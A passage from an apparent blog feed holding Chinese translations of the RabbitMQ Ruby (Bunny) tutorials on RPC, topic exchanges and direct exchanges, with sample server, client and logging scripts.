我们可以为每个客户端只建立一个独立的回调队列。</p><p>这就带来一个新问题，当此队列接收到一个响应的时候它无法辨别出这个响应是属于哪个请求的。<code>:correlation_id</code>就是为了解决这个问题而来的。我们给每个请求设置一个独一无二的值。稍后，当我们从回调队列中接收到一个消息的时候，我们就可以查看这条属性从而将响应和请求匹配起来。如果我们接手到的消息的<code>:correlation_id</code>是未知的，那就直接销毁掉它，因为它不属于我们的任何一条请求。</p><p>你也许会问，为什么我们接收到未知消息的时候不抛出一个错误，而是要将它忽略掉？这是为了解决服务器端有可能发生的竞争情况。尽管可能性不大，但RPC服务器还是有可能在已将应答发送给我们但还未将确认消息发送给请求的情况下死掉。如果这种情况发生，RPC在重启后会重新处理请求。这就是为什么我们必须在客户端优雅的处理重复响应，同时RPC也需要尽可能保持幂等性。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="https://www.rabbitmq.com/img/tutorials/python-six.png" alt="python-six"></p><p>我们的RPC如此工作:</p><ul><li>当客户端启动的时候，它创建一个匿名独享的回调队列。</li><li>在RPC请求中，客户端发送带有两个属性的消息：一个是设置回调队列的<code>:reply_to</code>属性，另一个是设置唯一值的<code>:correlation_id</code>属性。</li><li>将请求发送到一个<code>rpc_queue</code>队列中。</li><li>RPC工作者（又名：服务器）等待请求发送到这个队列中来。当请求出现的时候，它执行他的工作并且将带有执行结果的消息发送给<code>:reply_to</code>字段指定的队列。</li><li>客户端等待回调队列里的数据。当有消息出现的时候，它会检查<code>:correlation_id</code>属性。如果此属性的值与请求匹配，将它返回给应用。</li></ul><h2 id="整合到一起"><a href="#整合到一起" class="headerlink" title="整合到一起"></a>整合到一起</h2><p>斐波那契数列任务：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(value)</span></span></span><br><span class="line">  <span class="keyword">return</span> value <span class="keyword">if</span> value.zero? <span class="params">||</span> value == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  fibonacci(value - <span class="number">1</span>) + fibonacci(value - <span class="number">2</span>)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>我们声明我们的fibonacci函数，它假设只有合法的正整数当作输入。（别指望这个函数能处理很大的数值，因为它可能是最慢的递归实现方式）。</p><p><a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/rpc_server.rb" target="_blank" rel="noopener">rpc_server.rb</a>代码：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FibonacciServer</span></span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span></span></span><br><span class="line">    @connection = Bunny.new</span><br><span class="line">    @connection.start</span><br><span class="line">    @channel = @connection.create_channel</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">start</span><span class="params">(queue_name)</span></span></span><br><span class="line">    @queue = channel.queue(queue_name)</span><br><span class="line">    @exchange = channel.default_exchange</span><br><span class="line">    subscribe_to_queue</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">stop</span></span></span><br><span class="line">    channel.close</span><br><span class="line">    connection.close</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  private</span><br><span class="line"></span><br><span class="line">  <span class="keyword">attr_reader</span> <span class="symbol">:channel</span>, <span class="symbol">:exchange</span>, <span class="symbol">:queue</span>, <span class="symbol">:connection</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">subscribe_to_queue</span></span></span><br><span class="line">    queue.subscribe(<span class="symbol">block:</span> <span class="literal">true</span>) <span class="keyword">do</span> <span class="params">|_delivery_info, properties, payload|</span></span><br><span class="line">      result = fibonacci(payload.to_i)</span><br><span class="line"></span><br><span class="line">      exchange.publish(</span><br><span class="line">        result.to_s,</span><br><span class="line">        <span class="symbol">routing_key:</span> properties.reply_to,</span><br><span class="line">        <span class="symbol">correlation_id:</span> properties.correlation_id</span><br><span class="line">      )</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">fibonacci</span><span class="params">(value)</span></span></span><br><span class="line">    <span class="keyword">return</span> value <span class="keyword">if</span> value.zero? <span class="params">||</span> value == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    fibonacci(value - <span class="number">1</span>) + fibonacci(value - <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line">  server = FibonacciServer.new</span><br><span class="line"></span><br><span class="line">  puts <span class="string">' [x] Awaiting RPC requests'</span></span><br><span class="line">  server.start(<span class="string">'rpc_queue'</span>)</span><br><span class="line"><span class="keyword">rescue</span> Interrupt =&gt; <span class="number">_</span></span><br><span class="line">  server.stop</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>服务器端代码相当简单：</p><ul><li>像往常一样，我们建立连接、通道，并声明队列。</li><li>或许我们希望能在服务器上多开几个线程。为了能将负载平均地分摊到多个服务器，我们需要将通道上的<code>prefetch</code>设置好。</li><li>我们使用<code>Bunny::Queue#subscribe</code>来从队列里接收消息。我们等待请求消息，处理消息，返回响应，然后无线循环以上三步。</li></ul><p><a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/rpc_client.rb" target="_blank" rel="noopener">rpc_client.rb</a>代码:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'bunny'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'thread'</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FibonacciClient</span></span></span><br><span class="line">  <span class="keyword">attr_accessor</span> <span class="symbol">:call_id</span>, <span class="symbol">:response</span>, <span class="symbol">:lock</span>, <span class="symbol">:condition</span>, <span class="symbol">:connection</span>,</span><br><span class="line">                <span class="symbol">:channel</span>, <span class="symbol">:server_queue_name</span>, <span class="symbol">:reply_queue</span>, <span class="symbol">:exchange</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">initialize</span><span class="params">(server_queue_name)</span></span></span><br><span class="line">    @connection = Bunny.new(<span class="symbol">automatically_recover:</span> <span class="literal">false</span>)</span><br><span class="line">    @connection.start</span><br><span class="line"></span><br><span class="line">    @channel = connection.create_channel</span><br><span class="line">    @exchange = channel.default_exchange</span><br><span class="line">    @server_queue_name = server_queue_name</span><br><span class="line"></span><br><span class="line">    setup_reply_queue</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">call</span><span class="params">(n)</span></span></span><br><span class="line">    @call_id = generate_uuid</span><br><span class="line"></span><br><span class="line">    exchange.publish(n.to_s,</span><br><span class="line">                     <span class="symbol">routing_key:</span> server_queue_name,</span><br><span class="line">                     <span class="symbol">correlation_id:</span> call_id,</span><br><span class="line">                     <span class="symbol">reply_to:</span> reply_queue.name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># wait for the signal to continue the execution</span></span><br><span class="line">    lock.synchronize &#123; condition.wait(lock) &#125;</span><br><span class="line"></span><br><span class="line">    response</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">stop</span></span></span><br><span class="line">    channel.close</span><br><span class="line">    connection.close</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  private</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">setup_reply_queue</span></span></span><br><span class="line">    @lock = Mutex.new</span><br><span class="line">    @condition = ConditionVariable.new</span><br><span class="line">    that = <span class="keyword">self</span></span><br><span class="line">    @reply_queue = channel.queue(<span class="string">''</span>, <span class="symbol">exclusive:</span> <span class="literal">true</span>)</span><br><span class="line"></span><br><span class="line">    reply_queue.subscribe <span class="keyword">do</span> <span class="params">|_delivery_info, properties, payload|</span></span><br><span class="line">      <span class="keyword">if</span> properties[<span class="symbol">:correlation_id</span>] == that.call_id</span><br><span class="line">        that.response = payload.to_i</span><br><span class="line"></span><br><span class="line">        <span class="comment"># sends the signal to continue the execution of #call</span></span><br><span class="line">        that.lock.synchronize &#123; that.condition.signal &#125;</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">generate_uuid</span></span></span><br><span class="line">    <span class="comment"># very naive but good enough for code examples</span></span><br><span class="line">    <span class="string">"<span class="subst">#&#123;rand&#125;</span><span class="subst">#&#123;rand&#125;</span><span class="subst">#&#123;rand&#125;</span>"</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">client = FibonacciClient.new(<span class="string">'rpc_queue'</span>)</span><br><span class="line"></span><br><span class="line">puts <span class="string">' [x] Requesting fib(30)'</span></span><br><span class="line">response = client.call(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">puts <span class="string">" [.] Got <span class="subst">#&#123;response&#125;</span>"</span></span><br><span class="line"></span><br><span class="line">client.stop</span><br></pre></td></tr></table></figure></p><p>现在是时候来看一下我们的完整样例代码了：<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/rpc_client.rb" target="_blank" rel="noopener">rpc_client.rb</a>和<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/rpc_server.rb" target="_blank" rel="noopener">rpc_server.rb</a>。（尽管它们只有一下基本的异常处理）</p><p>我们的RPC服务已经准备就绪了，现在启动服务器端：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby rpc_server.rb</span><br><span class="line"><span class="comment"># =&gt; [x] Awaiting RPC requests</span></span><br></pre></td></tr></table></figure></p><p>运行客户端，请求一个fibonacci数。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby rpc_client.rb</span><br><span class="line"><span class="comment"># =&gt; [x] Requesting fib(30)</span></span><br></pre></td></tr></table></figure><p>此处呈现的设计并不是实现RPC服务的唯一方式，但是他有一些重要的优势：</p><ul><li>如果RPC服务器运行的过慢的时候，你可以通过运行另外一个服务器端轻松扩展它。试试在控制台中运行第二个 <code>rpc_server.rb</code>。</li><li>在客户端，RPC请求只发送或接收一条消息。不需要像<code>Bunny::Channel#queue</code>这样的异步调用。所以RPC客户端的单个请求只需要一个网络往返。</li></ul><p>我们的代码依旧非常简单，而且没有试图去解决一些复杂（但是重要）的问题，如：</p><ul><li>当没有服务器运行时，客户端如何作出反映。</li><li>客户端是否需要实现类似RPC超时的东西。</li><li>如果服务器发生故障，并且抛出异常，应该被转发到客户端吗？</li><li>在处理前，防止混入无效的信息（例如检查边界）。</li></ul><blockquote><p>如果你想做一些实验，你会发现<a href="https://www.rabbitmq.com/management.html" target="_blank" rel="noopener">管理页面</a>在观测队列方面是很有用处的。</p></blockquote>]]></content>
      
      <categories>
          
          <category> Ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> Ruby </tag>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RabbitMQ教程（五）──主题</title>
      <link href="/2017/10/05/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%94%EF%BC%89%E2%94%80%E2%94%80%E4%B8%BB%E9%A2%98/"/>
      <url>/2017/10/05/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%BA%94%EF%BC%89%E2%94%80%E2%94%80%E4%B8%BB%E9%A2%98/</url>
      <content type="html"><![CDATA[<h1 id="RabbitMQ教程（五）──主题"><a href="#RabbitMQ教程（五）──主题" class="headerlink" title="RabbitMQ教程（五）──主题"></a>RabbitMQ教程（五）──主题</h1><p>（使用Bunny）</p><p>上一篇教程里，我们改进了我们的日志系统。我们使用直连交换机替代了扇型交换机，从只能盲目的广播消息改进为有可能选择性的接收日志。</p><p>尽管直连交换机能够改善我们的系统，但是它也有它的限制 ——<br>没办法基于多个标准执行路由操作。</p><p>在我们的日志系统中，我们不只希望订阅基于严重程度的日志，同时还希望订阅基于发送来源的日志。Unix工具<a href="http://en.wikipedia.org/wiki/Syslog" target="_blank" rel="noopener">syslog</a>就是同时基于严重程度-severity<br>(info/warn/crit…) 和 设备-facility (auth/cron/kern…)来路由日志的。</p><p>如果这样的话，将会给予我们非常大的灵活性，我们既可以监听来源于“cron”的严重程度为“critical<br>errors”的日志，也可以监听来源于“kern”的所有日志。</p><p>为了实现这个目的，接下来我们学习如何使用另一种更复杂的交换机 —— 主题交换机。</p><h2 id="主题交换机"><a href="#主题交换机" class="headerlink" title="主题交换机"></a>主题交换机</h2><p>发送到主题交换机（topic<br>exchange）的消息不可以携带随意什么样子的路由键（routing_key），它的路由键必须是一个由.分隔开的词语列表。这些单词随便是什么都可以，但是最好是跟携带它们的消息有关系的词汇。以下是几个推荐的例子：”stock.usd.nyse”,<br>“nyse.vmw”, “quick.orange.rabbit”。词语的个数可以随意，但是不要超过255字节。</p><p>绑定键也必须拥有同样的格式。主题交换机背后的逻辑跟直连交换机很相似 ——<br>一个携带着特定路由键的消息会被主题交换机投递给绑定键与之想匹配的队列。但是它的绑定键和路由键有两个特殊应用方式：</p><ul><li><code>*</code> (星号) 用来表示一个单词.</li><li><code>#</code> (井号) 用来表示任意数量（零个或多个）单词。</li></ul><p>下边用图说明：</p><p><img src="https://www.rabbitmq.com/img/tutorials/python-five.png" alt="python-five"></p><p>这个例子里，我们发送的所有消息都是用来描述小动物的。发送的消息所携带的路由键是由三个单词所组成的，这三个单词被两个.分割开。路由键里的第一个单词描述的是动物的手脚的利索程度，第二个单词是动物的颜色，第三个是动物的种类。所以它看起来是这样的：“<speed>.<colour>.<species>”。</species></colour></speed></p><p>我们创建了三个绑定：Q1的绑定键为“<em>.orange.</em>”，Q2的绑定键为<br>“<em>.</em>.rabbit”和“lazy.#”。</p><p>这三个绑定键被可以总结为：</p><ul><li>Q1 对所有的桔黄色动物都感兴趣。</li><li>Q2 则是对所有的兔子和所有懒惰的动物感兴趣。</li></ul><p>一个携带有“quick.orange.rabbit”的消息将会被分别投递给这两个队列。携带着“lazy.orange.elephant”的消息同样也会给两个队列都投递过去。另一方面携带有“quick.orange.fox”的消息会投递给第一个队列，携带有“lazy.brown.fox”的消息会投递给第二个队列。携带有“lazy.pink.rabbit”的消息只会被投递给第二个队列一次，即使它同时匹配第二个队列的两个绑定。携带着“quick.brown.fox”的消息不会投递给任何一个队列。</p><p>如果我们违反约定，发送了一个携带有一个单词或者四个单词（”orange” or<br>“quick.orange.male.rabbit”）的消息时，发送的消息不会投递给任何一个队列，而且会丢失掉。</p><p>但是另一方面，即使 “lazy.orange.male.rabbit”<br>有四个单词，他还是会匹配最后一个绑定，并且被投递到第二个队列中。</p><blockquote><p><strong>主题交换机</strong></p><p>主题交换机是很强大的，它可以表现出跟其他交换机类似的行为</p><p>当一个队列的绑定键为<code>#</code>（井号）<br>的时候，这个队列将会无视消息的路由键，接收所有的消息。</p><p>当 <code>*</code> (星号) 和 <code>#</code> (井号)<br>这两个特殊字符都未在绑定键中出现的时候，此时主题交换机就拥有的直连交换机的行为。</p></blockquote><h2 id="组合在一起"><a href="#组合在一起" class="headerlink" title="组合在一起"></a>组合在一起</h2><p>接下来我们会将主题交换机应用到我们的日志系统中。在开始工作前，我们假设日志的路由键由两个单词组成，路由键看起来是这样的：“<facility>.<severity>”</severity></facility></p><p>代码跟上一篇教程差不多。</p><p><code>emit_log_topic.rb</code>的代码：<br><code></code>ruby</p><p>#!/usr/bin/env ruby<br>require ‘bunny’</p><p>connection = Bunny.new<br>connection.start</p><p>channel = connection.create_channel<br>exchange = channel.topic(‘topic_logs’)<br>severity = ARGV.shift || ‘anonymous.info’<br>message = ARGV.empty? ? ‘Hello World!’ : ARGV.join(‘ ‘)</p><p>exchange.publish(message, routing_key: severity)<br>puts “ [x] Sent #{severity}:#{message}”</p><p>connection.close<br><code></code></p><p><code>receive_logs_topic.rb</code>的代码：<br><code></code>ruby</p><p>#!/usr/bin/env ruby<br>require ‘bunny’</p><p>abort “Usage: #{$PROGRAM_NAME} [binding key]” if ARGV.empty?</p><p>connection = Bunny.new<br>connection.start</p><p>channel = connection.create_channel<br>exchange = channel.topic(‘topic_logs’)<br>queue = channel.queue(‘’, exclusive: true)</p><p>ARGV.each do |severity|<br>  queue.bind(exchange, routing_key: severity)<br>end</p><p>puts ‘ [*] Waiting for logs. To exit press CTRL+C’</p><p>begin<br>  queue.subscribe(block: true) do |delivery_info, _properties, body|<br>    puts “ [x] #{delivery_info.routing_key}:#{body}”<br>  end<br>rescue Interrupt =&gt; _<br>  channel.close<br>  connection.close</p><p>  exit(0)<br>end<br><code></code></p><p>执行下边命令 接收所有日志：<br><code>bashruby receive_logs_topic.rb &quot;#&quot;</code></p><p>执行下边命令 接收来自”kern“设备的日志：<br><code>bashruby receive_logs_topic.rb &quot;kern.*&quot;</code></p><p>执行下边命令 只接收严重程度为”critical“的日志：<br><code>bashruby receive_logs_topic.rb &quot;*.critical&quot;</code></p><p>执行下边命令 建立多个绑定：<br><code>bashruby receive_logs_topic.rb &quot;kern.*&quot; &quot;*.critical&quot;</code></p><p>执行下边命令 发送路由键为 “kern.critical” 的日志：<br><code>bashruby emit_log_topic.rb &quot;kern.critical&quot; &quot;A critical kernel error&quot;</code></p><p>执行上边命令试试看效果吧。另外，上边代码不会对路由键和绑定键做任何假设，所以你可以在命令中使用超过两个路由键参数。</p><p>（完整代码参见<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/emit_log_topic.rb" target="_blank" rel="noopener">emit_logs_topic.rb</a><br>和<br><a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/receive_logs_topic.rb" target="_blank" rel="noopener">receive_logs_topic.rb</a>)</p><p>移步至教程六学习RPC。`</p>]]></content>
      
      <categories>
          
          <category> Ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> Ruby </tag>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RabbitMQ教程（四）──路由</title>
      <link href="/2017/10/04/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89%E2%94%80%E2%94%80%E8%B7%AF%E7%94%B1/"/>
      <url>/2017/10/04/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E5%9B%9B%EF%BC%89%E2%94%80%E2%94%80%E8%B7%AF%E7%94%B1/</url>
      <content type="html"><![CDATA[<h1 id="RabbitMQ教程（四）──路由"><a href="#RabbitMQ教程（四）──路由" class="headerlink" title="RabbitMQ教程（四）──路由"></a>RabbitMQ教程（四）──路由</h1><p>（使用Bunny）</p><p>在前面的教程中，我们实现了一个简单的日志系统。可以把日志消息广播给多个接收者。</p><p>本篇教程中我们打算新增一个功能 ——<br>使得它能够只订阅消息的一个字集。例如，我们只需要把严重的错误日志信息写入日志文件（存储到磁盘），但同时仍然把所有的日志信息输出到控制台中。</p><h2 id="绑定（Bindings）"><a href="#绑定（Bindings）" class="headerlink" title="绑定（Bindings）"></a>绑定（Bindings）</h2><p>前面的例子，我们已经创建过绑定（bindings），代码如下：<br><code>rubyqueue.bind(exchange_name)</code></p><p>绑定（binding）是指交换机（exchange）和队列（queue）的关系。可以简单理解为：这个队列（queue）对这个交换机（exchange）的消息感兴趣。</p><p>绑定的时候可以带上一个额外的<code>:routing_key</code>参数。为了避免与<code>Bunny::Exchange#publish</code>的参数混淆，我们把它叫做绑定键（binding<br>key）。以下是如何创建一个带绑定键的绑定：<br><code>rubyqueue.bind(exchange_name, routing_key: &#39;black&#39;)</code></p><p>绑定键的意义取决于交换机（exchange）的类型。我们之前使用过的扇型交换机（fanout<br>exchanges）会忽略这个值。</p><h2 id="直连交换机（Direct-exchange）"><a href="#直连交换机（Direct-exchange）" class="headerlink" title="直连交换机（Direct exchange）"></a>直连交换机（Direct exchange）</h2><p>我们的日志系统广播所有的消息给所有的消费者（consumers）。我们打算扩展它，使其基于日志的严重程度进行消息过滤。例如我们也许只是希望将比较严重的错误（error）日志写入磁盘，以免在警告（warning）或者信息（info）日志上浪费磁盘空间。</p><p>我们使用的扇型交换机（fanout exchange）没有足够的灵活性 —— 它能做的仅仅是广播。</p><p>我们将会使用直连交换机（direct exchange）来代替。路由的算法很简单 ——<br>交换机将会对绑定键（binding key）和路由键（routing<br>key）进行精确匹配，从而确定消息该分发到哪个队列。</p><p>下图能够很好的描述这个场景：</p><p><img src="https://www.rabbitmq.com/img/tutorials/direct-exchange.png" alt="direct-exchange"></p><p>在这个场景中，我们可以看到直连交换机<br>X和两个队列进行了绑定。第一个队列使用orange作为绑定键，第二个队列有两个绑定，一个使用black作为绑定键，另外一个使用green。</p><p>这样以来，当路由键为orange的消息发布到交换机，就会被路由到队列Q1。路由键为black或者green的消息就会路由到Q2。其他的所有消息都将会被丢弃。</p><h2 id="多个绑定（Multiple-bindings）"><a href="#多个绑定（Multiple-bindings）" class="headerlink" title="多个绑定（Multiple bindings）"></a>多个绑定（Multiple bindings）</h2><p><img src="https://www.rabbitmq.com/img/tutorials/direct-exchange-multiple.png" alt="direct-exchange-multiple"></p><p>多个队列使用相同的绑定键是合法的。这个例子中，我们可以添加一个X和Q1之间的绑定，使用black绑定键。这样一来，直连交换机就和扇型交换机的行为一样，会将消息广播到所有匹配的队列。带有black路由键的消息会同时发送到Q1和Q2。</p><h2 id="发送日志"><a href="#发送日志" class="headerlink" title="发送日志"></a>发送日志</h2><p>我们将会发送消息到一个直连交换机，把日志级别作为路由键。这样接收日志的脚本就可以根据严重级别来选择它想要处理的日志。我们先看看发送日志。</p><p>我们需要创建一个交换机（exchange）：<br><code>rubychannel.direct(&#39;logs&#39;)</code></p><p>然后我们发送一则消息：<br><code>rubyexchange = channel.direct(&#39;logs&#39;)exchange.publish(message, routing_key: severity)</code></p><p>我们先假设“severity”的值是info、warning、error中的一个。</p><h2 id="订阅"><a href="#订阅" class="headerlink" title="订阅"></a>订阅</h2><p>处理接收消息的方式和之前差不多，只有一个例外，我们将会为我们感兴趣的每个严重级别分别创建一个新的绑定。<br><code></code>ruby<br>queue = channel.queue(‘’)</p><p>ARGV.each do |severity|<br>  queue.bind(‘logs’, routing_key: severity)<br>end<br><code></code></p><h2 id="代码整合"><a href="#代码整合" class="headerlink" title="代码整合"></a>代码整合</h2><p><img src="https://www.rabbitmq.com/img/tutorials/python-four.png" alt="python-four"></p><p><code>emit_log_direct.rb</code>的代码：<br><code></code>ruby</p><p>#!/usr/bin/env ruby<br>require ‘bunny’</p><p>connection = Bunny.new<br>connection.start</p><p>channel = connection.create_channel<br>exchange = channel.direct(‘direct_logs’)<br>severity = ARGV.shift || ‘info’<br>message = ARGV.empty? ? ‘Hello World!’ : ARGV.join(‘ ‘)</p><p>exchange.publish(message, routing_key: severity)<br>puts “ [x] Sent ‘#{message}’”</p><p>connection.close<br><code></code></p><p><code>receive_logs_direct.rb</code>的代码：<br><code></code>ruby</p><p>#!/usr/bin/env ruby<br>require ‘bunny’</p><p>abort “Usage: #{$PROGRAM_NAME} [info] [warning] [error]” if ARGV.empty?</p><p>connection = Bunny.new<br>connection.start</p><p>channel = connection.create_channel<br>exchange = channel.direct(‘direct_logs’)<br>queue = channel.queue(‘’, exclusive: true)</p><p>ARGV.each do |severity|<br>  queue.bind(exchange, routing_key: severity)<br>end</p><p>puts ‘ [*] Waiting for logs. To exit press CTRL+C’</p><p>begin<br>  queue.subscribe(block: true) do |delivery_info, _properties, body|<br>    puts “ [x] #{delivery_info.routing_key}:#{body}”<br>  end<br>rescue Interrupt =&gt; _<br>  channel.close<br>  connection.close</p><p>  exit(0)<br>end<br><code></code></p><p>如果你希望只是保存warning和error级别的日志到磁盘，只需要打开控制台并输入：<br><code>bashruby receive_logs_direct.rb warning error &gt; logs_from_rabbit.log</code></p><p>如果你希望所有的日志信息都输出到屏幕中，打开一个新的终端，然后输入：<br><code></code>bash<br>ruby receive_logs_direct.rb info warning error</p><h1 id="gt-Waiting-for-logs-To-exit-press-CTRL-C"><a href="#gt-Waiting-for-logs-To-exit-press-CTRL-C" class="headerlink" title="=&gt; [*] Waiting for logs. To exit press CTRL+C"></a>=&gt; [*] Waiting for logs. To exit press CTRL+C</h1><p><code></code></p><p>如果要触发一个error级别的日志，只需要输入：<br><code></code>bash<br>ruby emit_log_direct.rb error “Run. Run. Or it will explode.”</p><h1 id="gt-x-Sent-‘error’-’Run-Run-Or-it-will-explode-’"><a href="#gt-x-Sent-‘error’-’Run-Run-Or-it-will-explode-’" class="headerlink" title="=&gt; [x] Sent ‘error’:’Run. Run. Or it will explode.’"></a>=&gt; [x] Sent ‘error’:’Run. Run. Or it will explode.’</h1><p><code></code></p><p>这里是完整的代码：(<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/emit_log_direct.rb" target="_blank" rel="noopener">emit_log_direct.rb</a>和<a href="https://github.com/rabbitmq/rabbitmq-tutorials/blob/master/ruby/receive_logs_direct.rb" target="_blank" rel="noopener">receive_logs_direct.rb</a>)</p><p>下一篇教程告诉我们如何基于模式来监听消息。</p>]]></content>
      
      <categories>
          
          <category> Ruby </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RabbitMQ </tag>
            
            <tag> Ruby </tag>
            
            <tag> 翻译 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RabbitMQ教程（三）──发布、订阅</title>
      <link href="/2017/10/03/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%E2%94%80%E2%94%80%E5%8F%91%E5%B8%83%E3%80%81%E8%AE%A2%E9%98%85/"/>
      <url>/2017/10/03/RabbitMQ%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%89%EF%BC%89%E2%94%80%E2%94%80%E5%8F%91%E5%B8%83%E3%80%81%E8%AE%A2%E9%98%85/</url>
